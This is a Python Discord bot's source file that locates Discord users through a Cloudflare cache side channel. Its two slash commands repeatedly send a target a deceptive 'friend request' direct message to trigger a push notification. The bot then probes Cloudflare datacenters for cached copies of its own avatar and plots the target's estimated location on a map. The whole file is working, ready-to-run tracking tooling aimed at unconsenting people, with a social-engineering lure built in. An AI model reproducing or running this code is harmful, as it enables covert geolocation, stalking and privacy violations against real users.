__AUTHOR__: str = "norahc-x inspired by hackermondev" 

import io
import math
import random
import requests
import discord
import asyncio
import datacenters_list
from discord.ext import commands
from discord import Option
from datacenters_list import datacenters



TOKEN = "" 
MY_USER_ID =   
GOOGLE_MAPS_API_KEY = ""

AVATAR_URLS = [
    #Add your avatar list here to randomly change the bot pic 
]

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(intents=intents)

# SUPPORT FUNCTIONS 

def check_cache_status(url: str) -> str:
    """
    Performs a GET request to the given URL and returns the 'cf-cache-status' header (HIT or MISS).
    """
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        return response.headers.get('cf-cache-status', 'MISS')
    except requests.exceptions.RequestException as e:
        print(f"Error requesting {url}: {e}")
        return 'MISS'

def track_location_with_avatar(avatar_url: str):
    """
    Checks which datacenters respond with 'HIT' for the bot's avatar (push notification).
    Returns a list of those datacenters.
    """
    hits = []
    for dc in datacenters:
        full_url = dc['url'] + avatar_url
        cache_status = check_cache_status(full_url)
        if cache_status == 'HIT':
            hits.append(dc)
            print(f"[HIT]  - {dc['city']} ({dc['url']})")
        else:
            print(f"[MISS] - {dc['city']} ({dc['url']})")
    return hits

async def set_bot_avatar(image_content: bytes, ctx: discord.ApplicationContext = None):
    """
    Sets the bot's avatar using the given image bytes.
    If ctx is provided, sends a confirmation message.
    """
    try:
        await bot.user.edit(avatar=image_content)
        if ctx:
            await ctx.followup.send("✅ Bot avatar updated successfully!", ephemeral=True)
    except Exception as e:
        if ctx:
            await ctx.followup.send(f"❌ Error setting the bot's avatar: {e}", ephemeral=True)
        else:
            print(f"Error setting the bot's avatar: {e}")

async def randomize_bot_avatar(ctx: discord.ApplicationContext = None):
    """
    Chooses a random URL from AVATAR_URLS, downloads the image, and sets it as the bot's avatar.
    """
    avatar_url = random.choice(AVATAR_URLS)
    print(f"Randomizing avatar with: {avatar_url}")
    try:
        response = requests.get(avatar_url, timeout=5)
        if response.status_code == 200:
            await set_bot_avatar(response.content, ctx)
        else:
            print("❌ Could not download the random avatar image.")
    except Exception as e:
        print(f"❌ Error during avatar randomization: {e}")

#  MAP FUNCTIONS 

def build_circle_path(lat_center, lon_center, radius_km=200, num_points=36):
    """
    Generates a list of (lat, lon) coordinates approximating a circle of radius_km
    centered at (lat_center, lon_center).
    """
    coords = []
    earth_radius = 6371.0
    lat_rad = math.radians(lat_center)
    lon_rad = math.radians(lon_center)

    for i in range(num_points):
        angle = 2 * math.pi * (i / num_points)
        lat_offset = (radius_km / earth_radius) * math.cos(angle)
        lon_offset = (radius_km / earth_radius) * math.sin(angle)

        new_lat = lat_rad + lat_offset
        new_lon = lon_rad + lon_offset / math.cos(lat_rad)
        coords.append((math.degrees(new_lat), math.degrees(new_lon)))

    coords.append(coords[0])  # close the circle
    return coords

def build_static_map(
    hits,
    multiple_datacenters: bool,
    avg_lat=0.0,
    avg_lon=0.0,
    radius_orange=300,
    radius_red=150,
    radius_blue=75,
    num_points=36
):
    """
    Builds the URL for a Google Static Map with the following logic:
    - If multiple_datacenters=True (i.e., more than one datacenter):
      1) Draw an orange circle (300 km) around each datacenter + a 'P' marker on each datacenter.
      2) Compute the average location (avg_lat, avg_lon) and draw:
         - A red circle (150 km) at that point
         - A blue circle (75 km) at the same point
    - If there's only one datacenter (multiple_datacenters=False):
      Draw three circles (orange, red, blue) on that single datacenter + one 'P' marker on it.
      
    """
    base_url = "https://maps.googleapis.com/maps/api/staticmap?"
    map_params = [
        "size=600x400",
        "maptype=roadmap",
        f"key={GOOGLE_MAPS_API_KEY}"
    ]

    path_list = []

    if multiple_datacenters:
        # More than one datacenter
        for dc in hits:
            # Orange circle (300 km)
            circle_coords_orange = build_circle_path(dc['lat'], dc['lon'], radius_km=radius_orange, num_points=num_points)
            coords_str_orange = "|".join(f"{c[0]},{c[1]}" for c in circle_coords_orange)
            path_orange = f"path=color:0xFFA500ff|fillcolor:0xFFA50022|{coords_str_orange}"
            path_list.append(path_orange)

            # Marker "P" for each datacenter
            marker_str = f"markers=label:P|{dc['lat']},{dc['lon']}"
            map_params.append(marker_str)

        # Red circle (150 km) at the midpoint
        circle_coords_red = build_circle_path(avg_lat, avg_lon, radius_km=radius_red, num_points=num_points)
        coords_str_red = "|".join(f"{c[0]},{c[1]}" for c in circle_coords_red)
        path_red = f"path=color:0xFF0000ff|fillcolor:0xFF000022|{coords_str_red}"
        path_list.append(path_red)

        # Blue circle (75 km) at the midpoint
        circle_coords_blue = build_circle_path(avg_lat, avg_lon, radius_km=radius_blue, num_points=num_points)
        coords_str_blue = "|".join(f"{c[0]},{c[1]}" for c in circle_coords_blue)
        path_blue = f"path=color:0x0000ffff|fillcolor:0x0000ff22|{coords_str_blue}"
        path_list.append(path_blue)

    else:
        # Only one datacenter => 3 circles on it
        dc = hits[0]
        # Orange circle
        circle_coords_orange = build_circle_path(dc['lat'], dc['lon'], radius_km=radius_orange, num_points=num_points)
        coords_str_orange = "|".join(f"{c[0]},{c[1]}" for c in circle_coords_orange)
        path_orange = f"path=color:0xFFA500ff|fillcolor:0xFFA50022|{coords_str_orange}"
        path_list.append(path_orange)

        # Red circle
        circle_coords_red = build_circle_path(dc['lat'], dc['lon'], radius_km=radius_red, num_points=num_points)
        coords_str_red = "|".join(f"{c[0]},{c[1]}" for c in circle_coords_red)
        path_red = f"path=color:0xFF0000ff|fillcolor:0xFF000022|{coords_str_red}"
        path_list.append(path_red)

        # Blue circle
        circle_coords_blue = build_circle_path(dc['lat'], dc['lon'], radius_km=radius_blue, num_points=num_points)
        coords_str_blue = "|".join(f"{c[0]},{c[1]}" for c in circle_coords_blue)
        path_blue = f"path=color:0x0000ffff|fillcolor:0x0000ff22|{coords_str_blue}"
        path_list.append(path_blue)

        # Marker "P" on that single datacenter
        marker_str = f"markers=label:P|{dc['lat']},{dc['lon']}"
        map_params.append(marker_str)

    for path in path_list:
        map_params.append(path)

    query_string = "&".join(map_params)
    return base_url + query_string

#  EVENT: ON_READY 

@bot.event
async def on_ready():
    print(f"Bot connected as {bot.user}")

#  COMMAND 1: locate_id 

@bot.slash_command(
    name="locate_id",
)
async def locate_id(
    ctx: discord.ApplicationContext,
    user_id: Option(str, "User ID (numeric)"), # type: ignore
    avatar_url: Option(str, "Bot avatar URL (optional)", required=False, default=None) # type: ignore
):
    if ctx.author.id != MY_USER_ID:
        await ctx.respond("❌ You do not have permission to use this command.", ephemeral=True)
        return

    await ctx.defer()

    # 1) Set bot avatar
    await randomize_bot_avatar(ctx)
    if avatar_url:
        try:
            resp = requests.get(avatar_url, timeout=5)
            if resp.status_code == 200:
                await set_bot_avatar(resp.content, ctx)
            else:
                await ctx.followup.send("❌ Could not download the custom avatar image.", ephemeral=True)
        except Exception as e:
            await ctx.followup.send(f"❌ Error setting the bot avatar: {e}", ephemeral=True)

    # 2) Fetch user
    try:
        uid = int(user_id)
        target_user = await bot.fetch_user(uid)
    except ValueError:
        await ctx.followup.send("❌ The user ID must be an integer.")
        return
    except discord.NotFound:
        await ctx.followup.send("❌ User not found. Possibly an incorrect ID.")
        return
    except discord.HTTPException as e:
        await ctx.followup.send(f"❌ Error fetching the user: {e}")
        return

    # 3) Loop attempts
    max_attempts = 10
    attempt = 0
    hits = []

    bot_id = bot.user.id
    bot_avatar_hash = bot.user.avatar
    if not bot_avatar_hash:
        await ctx.followup.send("❌ The bot does not have an avatar set. Cannot complete triangulation.")
        return

    avatar_url_path = f"/avatars/{bot_id}/{bot_avatar_hash}"

    while attempt < max_attempts and not hits:
        try:
            await target_user.send("Hello! This is a friend request. 😊")
            await ctx.followup.send(
                f"Attempt {attempt+1} to send DM to **{target_user.name}** (ID: {user_id}).\n"
                "Waiting a few seconds for the push notification...",
                ephemeral=True
            )
        except discord.HTTPException as e:
            await ctx.followup.send(f"❌ Unable to send the friend request: {e}")
            return

        await asyncio.sleep(6)
        hits = track_location_with_avatar(avatar_url_path)
        attempt += 1

    if not hits:
        await ctx.followup.send("❌ No datacenter returned HIT after several attempts. Unable to determine location.")
        return

    # 4) Determine if multiple datacenters
    multiple_datacenters = (len(hits) > 1)

    # 5) If multiple datacenters, compute midpoint
    if multiple_datacenters:
        avg_lat = sum(dc['lat'] for dc in hits) / len(hits)
        avg_lon = sum(dc['lon'] for dc in hits) / len(hits)
    else:
        avg_lat = hits[0]['lat']
        avg_lon = hits[0]['lon']

    # Build map URL
    map_url = build_static_map(
        hits=hits,
        multiple_datacenters=multiple_datacenters,
        avg_lat=avg_lat,
        avg_lon=avg_lon,
        radius_orange=300,
        radius_red=150,
        radius_blue=75
    )

    # 6) Download map
    map_response = requests.get(map_url)
    if map_response.status_code == 200:
        file_obj = discord.File(io.BytesIO(map_response.content), filename="map.png")

        # Prepare the embed description
        if multiple_datacenters:
            desc = (
                "**Datacenters with HIT:**\n"
            )
            for dc in hits:
                desc += f"- {dc['city']}: lat={dc['lat']}, lon={dc['lon']}\n"
            desc += (
                "\n**Orange circles (300 km)** on each datacenter + 'P' markers.\n"
                f"**Red circle (150 km)** and **blue circle (75 km)** at the average location.\n"
                f"**Average location**: lat={avg_lat:.4f}, lon={avg_lon:.4f}\n"
            )
        else:
            dc = hits[0]
            desc = (
                "**Only one datacenter with HIT:**\n"
                f"- {dc['city']}: lat={dc['lat']}, lon={dc['lon']}\n\n"
                "**Three circles** (orange, red, blue) on that datacenter + 'P' marker.\n"
                f"lat={dc['lat']:.4f}, lon={dc['lon']:.4f}\n"
            )

        embed = discord.Embed(title="Approximate Location", description=desc)
        embed.set_image(url="attachment://map.png")
        await ctx.followup.send(embed=embed, file=file_obj)
    else:
        await ctx.followup.send(
            "Some datacenters responded with HIT, but the map is not available "
            f"(error {map_response.status_code})."
        )

#  COMMAND 2: locate_name 

@bot.slash_command(
    name="locate_name",
)
async def locate_name(
    ctx: discord.ApplicationContext,
    username: Option(str, "Unique username"), # type: ignore
    avatar_url: Option(str, "Bot avatar URL (optional)", required=False, default=None) # type: ignore
):
    if ctx.author.id != MY_USER_ID:
        await ctx.respond("❌ You do not have permission to use this command.", ephemeral=True)
        return

    await ctx.defer()

    # 1) Avatar
    await randomize_bot_avatar(ctx)
    if avatar_url:
        try:
            resp = requests.get(avatar_url, timeout=5)
            if resp.status_code == 200:
                await set_bot_avatar(resp.content, ctx)
            else:
                await ctx.followup.send("❌ Could not download the custom avatar image.", ephemeral=True)
        except Exception as e:
            await ctx.followup.send(f"❌ Error setting the bot avatar: {e}", ephemeral=True)

    # 2) Find user in bot.users
    target_user = None
    for u in bot.users:
        if u.name == username:
            target_user = u
            break

    if not target_user:
        await ctx.followup.send(
            f"❌ No user with username: **{username}** found.\n"
            "They must share at least one server with the bot."
        )
        return

    # 3) Attempt loop
    max_attempts = 10
    attempt = 0
    hits = []

    bot_id = bot.user.id
    bot_avatar_hash = bot.user.avatar
    if not bot_avatar_hash:
        await ctx.followup.send("❌ The bot does not have an avatar set. Cannot complete triangulation.")
        return

    avatar_url_path = f"/avatars/{bot_id}/{bot_avatar_hash}"

    while attempt < max_attempts and not hits:
        try:
            await target_user.send("Hello! This is a friend request. 😊")
            await ctx.followup.send(
                f"Attempt {attempt+1} to send DM to **{target_user.name}**.\n"
                "Waiting a few seconds for the push notification...",
                ephemeral=True
            )
        except discord.HTTPException as e:
            await ctx.followup.send(f"❌ Unable to send the friend request: {e}")
            return

        await asyncio.sleep(6)
        hits = track_location_with_avatar(avatar_url_path)
        attempt += 1

    if not hits:
        await ctx.followup.send("❌ No datacenter returned HIT after several attempts. Unable to determine location.")
        return

    # 4) Single or multiple datacenters
    multiple_datacenters = (len(hits) > 1)

    if multiple_datacenters:
        avg_lat = sum(dc['lat'] for dc in hits) / len(hits)
        avg_lon = sum(dc['lon'] for dc in hits) / len(hits)
    else:
        avg_lat = hits[0]['lat']
        avg_lon = hits[0]['lon']

    # 5) Build map
    map_url = build_static_map(
        hits=hits,
        multiple_datacenters=multiple_datacenters,
        avg_lat=avg_lat,
        avg_lon=avg_lon,
        radius_orange=300,
        radius_red=150,
        radius_blue=75
    )

    map_response = requests.get(map_url)
    if map_response.status_code == 200:
        file_obj = discord.File(io.BytesIO(map_response.content), filename="map.png")
                                                                                                                                                                                                                                                   
        if multiple_datacenters:
            desc = "**Datacenters with HIT:**\n"
            for dc in hits:
                desc += f"- {dc['city']}: lat={dc['lat']}, lon={dc['lon']}\n"
            desc += (
                "\n**Orange circles (300 km)** on each datacenter + 'P' markers.\n"
                f"**Red circle (150 km)** and **blue circle (75 km)** at the average location.\n"
                f"**Average location**: lat={avg_lat:.4f}, lon={avg_lon:.4f}\n"
            )
        else:
            dc = hits[0]
            desc = (
                "**Only one datacenter with HIT:**\n"
                f"- {dc['city']}: lat={dc['lat']}, lon={dc['lon']}\n\n"
                "**Three circles** (orange, red, blue) on that datacenter + 'P' marker.\n"
                f"lat={dc['lat']:.4f}, lon={dc['lon']:.4f}\n"
            )

        embed = discord.Embed(title="Approximate Location", description=desc)
        embed.set_image(url="attachment://map.png")
        await ctx.followup.send(embed=embed, file=file_obj)
    else:
        await ctx.followup.send(
            "Some datacenters responded with HIT, but the map is not available "
            f"(error {map_response.status_code})."
        )
        
#  BOT RUN 
bot.run(TOKEN)
